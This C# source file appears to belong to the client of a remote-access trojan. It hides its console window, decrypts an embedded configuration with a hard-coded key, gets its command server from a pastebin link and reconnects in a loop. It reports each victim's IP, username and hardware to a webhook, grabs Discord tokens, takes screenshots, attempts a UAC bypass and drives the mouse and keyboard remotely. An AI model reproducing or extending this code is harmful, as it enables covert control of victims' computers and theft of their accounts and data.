using LazyServer;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using PentestTools;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Encoder = System.Drawing.Imaging.Encoder;

public static class GClass
{
    // DLL Imports for console visibility
    [DllImport("kernel32.dll")] private static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    private static JObject _cachedConfig;

    public static JObject config()
    {
        if (_cachedConfig != null)
            return _cachedConfig;

        var assembly = Assembly.GetExecutingAssembly();
        var resourceName = "Client.config.json";

        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        using (StreamReader reader = new StreamReader(stream))
        {
            var raw = reader.ReadToEnd();
            var decrypted = string.Empty;
            if (!IsJson(raw)) {
                decrypted = GClass.AesDecrypt(raw, "pe3ASaxZMwfg");
            }
            Console.WriteLine(IsJson(raw) ? GClass.AesEncrypt(raw, "pe3ASaxZMwfg") : decrypted);
            _cachedConfig = JObject.Parse(IsJson(raw) ? raw : decrypted);
            return _cachedConfig;
        }
    }
    private static bool IsJson(string strInput)
    {
        if (string.IsNullOrWhiteSpace(strInput)) { return false; }
        strInput = strInput.Trim();
        if ((strInput.StartsWith("{") && strInput.EndsWith("}")) || //For object
            (strInput.StartsWith("[") && strInput.EndsWith("]"))) //For array
        {
            try
            {
                var obj = JToken.Parse(strInput);
                return true;
            }
            catch (JsonReaderException jex)
            {
                //Exception in parsing json
                Console.WriteLine(jex.Message);
                return false;
            }
            catch (Exception ex) //some other exception
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }
        else
        {
            return false;
        }
    }
    public static bool IsTrue(string param)
    {
        return config()[param]?.Value<bool>() ?? false;
    }

    public static void ShowCmd(bool show)
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, show ? SW_SHOW : SW_HIDE);
    }

    public static async Task ReconnectLoop(Func<LazyServerClient> clientFactory)
    {
        var server = (string)config()["server"];
        var port = (int)config()["port"];

        if ((bool)config()["pastebin"])
        {
            try
            {
                string pastebinres = await new HttpClient().GetStringAsync((string)config()["pastebinlink"]);
                if (!string.IsNullOrEmpty(pastebinres))
                {
                    string[] strings = pastebinres.Split(':');
                    server = strings[0];
                    port = int.Parse(strings[1]);
                }
            }
            catch
            {
                server = (string)config()["server"];
                port = (int)config()["port"];
            }
        }

        while (true)
        {
            LazyServerClient client = clientFactory();
            client.Disconnected += async (_, __) =>
            {
                Console.WriteLine("Lost connection, reconnecting...");
                await ReconnectLoop(clientFactory); // restart the loop
            };

            try
            {
                await client.ConnectAsync(server, port);
                Console.WriteLine("Connected!");
                break; // If you want *only startup reconnect*, keep this. If you want permanent, remove it.
            }
            catch
            {
                Console.WriteLine("Retrying connection in 1 second...");
                await Task.Delay(1000);
            }
        }
    }


    public static async Task<string> GetIp()
    {
        try
        {
            var ip = await new HttpClient().GetStringAsync("http://icanhazip.com");
            return ip.Trim();
        }
        catch
        {
            return "Unknown";
        }
    }

    public static JObject GetDeviceInfo()
    {
        return new JObject
        {
            ["username"] = DeviceInfo.GetUsername(),
            ["os"] = DeviceInfo.GetOSInfo(),
            ["cpu"] = DeviceInfo.GetCPUInfo(),
            ["gpu"] = DeviceInfo.GetGPUInfo(),
            ["uac"] = DeviceInfo.GetUACStatus(),
            ["hwid"] = DeviceInfo.GetHWID()
        };
    }

    public static async Task SendWebhookNotificationAsync(string webhookUrl, JObject info)
    {
        try
        {
            var country = await FlagDownloader.GetCountryAsync(info["ip"].ToString());
            var embed = new JObject
            {
                ["title"] = "🟢 New Client Connected",
                ["color"] = 65280,
                ["fields"] = new JArray
                {
                    new JObject { ["name"] = "IP", ["value"] = $"`{info["ip"]}`", ["inline"] = true },
                    new JObject { ["name"] = "Username", ["value"] = $"`{info["username"]}`", ["inline"] = true },
                    new JObject { ["name"] = "OS", ["value"] = $"`{info["os"]}`", ["inline"] = false },
                    new JObject { ["name"] = "Country", ["value"] = $"`{country}`", ["inline"] = false },
                    new JObject { ["name"] = "CPU", ["value"] = $"`{info["cpu"]}`", ["inline"] = false },
                    new JObject { ["name"] = "GPU", ["value"] = $"`{info["gpu"]}`", ["inline"] = false },
                    new JObject { ["name"] = "UAC Status", ["value"] = $"`{info["uac"]}`", ["inline"] = true },
                    new JObject { ["name"] = "HWID", ["value"] = $"`{info["hwid"]}`", ["inline"] = true }
                },
                ["footer"] = new JObject
                {
                    ["text"] = "Client connected at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                }
            };

            var payload = new JObject
            {
                ["embeds"] = new JArray { embed }
            };

            using var httpClient = new HttpClient();
            var content = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
            await httpClient.PostAsync(webhookUrl, content);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Webhook error: " + ex.Message);
        }
    }

    public static string GetDiscordTokens()
    {
        return string.Join(" || ", DiscordGrabber.GetTokens());
    }

    public static void StartHeartbeat(LazyServerClient client)
    {
        Task.Run(async () =>
        {
            var ackReceived = false;

            client.MessageReceived += (s, e) =>
            {
                try
                {
                    if (e?.Message == null)
                        return;

                    // Expecting a plain "ack" string, or you can adjust for JSON if needed
                    if (e.Message.Trim().ToLower() == "ack")
                    {
                        ackReceived = true;
                    }
                }
                catch { }
            };

            while (true)
            {
                try
                {
                    if (client != null && client.IsConnected)
                    {
                        ackReceived = false;
                        var payload = Encoding.UTF8.GetBytes("ping");

                        // Retry until we receive "ack"
                        while (!ackReceived)
                        {
                            await client.SendHeartbeat(payload);
                            await Task.Delay(2000); // wait for ack

                            // Optional: timeout safeguard
                            // If needed, break out after N retries or log warning
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Heartbeat error: {ex.Message}");
                }

                await Task.Delay(30000); // wait 30 seconds until next ping cycle
            }
        });
    }


    public static byte[] CaptureScreen(Screen screen, int quality = 100)
    {
        return DeviceInfo.Capture(screen, quality);
    }


    public static ImageCodecInfo GetEncoder(ImageFormat format)
    {
        return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
    }

    public static async Task<bool> TryBypassAndReconnect(LazyServerClient client, byte[] screenshot)
    {
        if (!UacBypassHelper.TryBypassUAC())
        {
            Console.WriteLine("UAC Bypass failed.");
            await Task.Delay(3000);
            await GClass.ReconnectLoop(() => new LazyServerClient());

            var info = await BuildClientInfo();
            await client.SendFileViaUdp(screenshot, info.ToString());

            await client.SendFileViaUdp(screenshot, new JObject
            {
                ["msg"] = "log",
                ["message"] = "Failed to UAC Bypass",
                ["type"] = "Error"
            }.ToString());

            return false;
        }

        return true;
    }

    public static async Task<JObject> BuildClientInfo()
    {
        return new JObject
        {
            ["msg"] = "alive",
            ["ip"] = await GetIp(),
            ["username"] = DeviceInfo.GetUsername(),
            ["os"] = DeviceInfo.GetOSInfo(),
            ["cpu"] = DeviceInfo.GetCPUInfo(),
            ["gpu"] = DeviceInfo.GetGPUInfo(),
            ["uac"] = DeviceInfo.GetUACStatus(),
            ["hwid"] = DeviceInfo.GetHWID()
        };
    }

    private const int KeySize = 256;
    private const int BlockSize = 128;
    private const int DerivationIterations = 1000;

    public static string AesEncrypt(string plainText, string password)
    {
        byte[] saltBytes = GenerateRandomBytes(32);
        byte[] ivBytes = GenerateRandomBytes(16);
        byte[] keyBytes = GetKey(password, saltBytes);

        using (var aes = Aes.Create())
        {
            aes.KeySize = KeySize;
            aes.BlockSize = BlockSize;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = keyBytes;
            aes.IV = ivBytes;

            using (var encryptor = aes.CreateEncryptor())
            using (var ms = new MemoryStream())
            {
                ms.Write(saltBytes, 0, saltBytes.Length);
                ms.Write(ivBytes, 0, ivBytes.Length);

                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                using (var sw = new StreamWriter(cs))
                {
                    sw.Write(plainText);
                }

                return Convert.ToBase64String(ms.ToArray());
            }
        }
    }

    public static string AesDecrypt(string encryptedText, string password)
    {
        byte[] fullCipher = Convert.FromBase64String(encryptedText);

        byte[] saltBytes = new byte[32];
        byte[] ivBytes = new byte[16];
        Array.Copy(fullCipher, 0, saltBytes, 0, saltBytes.Length);
        Array.Copy(fullCipher, saltBytes.Length, ivBytes, 0, ivBytes.Length);

        byte[] cipherBytes = new byte[fullCipher.Length - saltBytes.Length - ivBytes.Length];
        Array.Copy(fullCipher, saltBytes.Length + ivBytes.Length, cipherBytes, 0, cipherBytes.Length);

        byte[] keyBytes = GetKey(password, saltBytes);

        using (var aes = Aes.Create())
        {
            aes.KeySize = KeySize;
            aes.BlockSize = BlockSize;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = keyBytes;
            aes.IV = ivBytes;

            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(cipherBytes))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var sr = new StreamReader(cs))
            {
                return sr.ReadToEnd();
            }
        }
    }

    private static byte[] GenerateRandomBytes(int length)
    {
        var randomBytes = new byte[length];
        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(randomBytes);
        }
        return randomBytes;
    }

    private static byte[] GetKey(string password, byte[] salt)
    {
        using (var keyDerivation = new Rfc2898DeriveBytes(password, salt, DerivationIterations))
        {
            return keyDerivation.GetBytes(KeySize / 8);
        }
    }
    // ========== INPUT SIMULATION METHODS ==========

    [DllImport("user32.dll")]
    private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    private const uint MOUSEEVENTF_MOVE = 0x0001;
    private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    private const uint MOUSEEVENTF_LEFTUP = 0x0004;
    private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
    private const uint MOUSEEVENTF_WHEEL = 0x0800;
    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(int X, int Y);
    private static readonly Dictionary<string, string> SpecialKeyMap = new()
    {
        ["enter"] = "{ENTER}",
        ["tab"] = "{TAB}",
        ["backspace"] = "{BACKSPACE}",
        ["escape"] = "{ESC}",
        ["esc"] = "{ESC}",
        ["space"] = "{SPACE}",
        ["left"] = "{LEFT}",
        ["right"] = "{RIGHT}",
        ["up"] = "{UP}",
        ["down"] = "{DOWN}",
        ["delete"] = "{DELETE}",
        ["insert"] = "{INSERT}",
        ["home"] = "{HOME}",
        ["end"] = "{END}",
        ["pageup"] = "{PGUP}",
        ["pagedown"] = "{PGDN}",
        ["capslock"] = "{CAPSLOCK}",
        ["numlock"] = "{NUMLOCK}",
        ["scrolllock"] = "{SCROLLLOCK}",
        ["f1"] = "{F1}",
        ["f2"] = "{F2}",
        ["f3"] = "{F3}",
        ["f4"] = "{F4}",
        ["f5"] = "{F5}",
        ["f6"] = "{F6}",
        ["f7"] = "{F7}",
        ["f8"] = "{F8}",
        ["f9"] = "{F9}",
        ["f10"] = "{F10}",
        ["f11"] = "{F11}",
        ["f12"] = "{F12}"
    };

    public static void MouseMoveAbsolute(int x, int y)
    {
        SetCursorPos(x, y);
    }

    public static void PerformMouseClick(string button)
    {
        switch (button.ToLower())
        {
            case "left":
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
                break;
            case "right":
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
                break;
            case "middle":
                mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, UIntPtr.Zero);
                mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, UIntPtr.Zero);
                break;
        }
    }

    public static void ScrollMouse(int delta)
    {
        mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (uint)delta, UIntPtr.Zero);
    }
    public static void SendKeyPress(string keyName)
    {
        if (string.IsNullOrWhiteSpace(keyName))
            return;

        string lower = keyName.ToLower();

        string sendKey = SpecialKeyMap.TryGetValue(lower, out var mappedKey)
            ? mappedKey
            : EscapeIfNeeded(keyName);

        SendKeys.SendWait(sendKey);
    }


    private static string EscapeIfNeeded(string key)
    {
        // Escape special SendKeys characters
        string escaped = key.Replace("+", "{+}")
                            .Replace("^", "{^}")
                            .Replace("%", "{%}")
                            .Replace("~", "{~}")
                            .Replace("(", "{(}")
                            .Replace(")", "{)}")
                            .Replace("{", "{{}")
                            .Replace("}", "{}}");

        return escaped;
    }

}
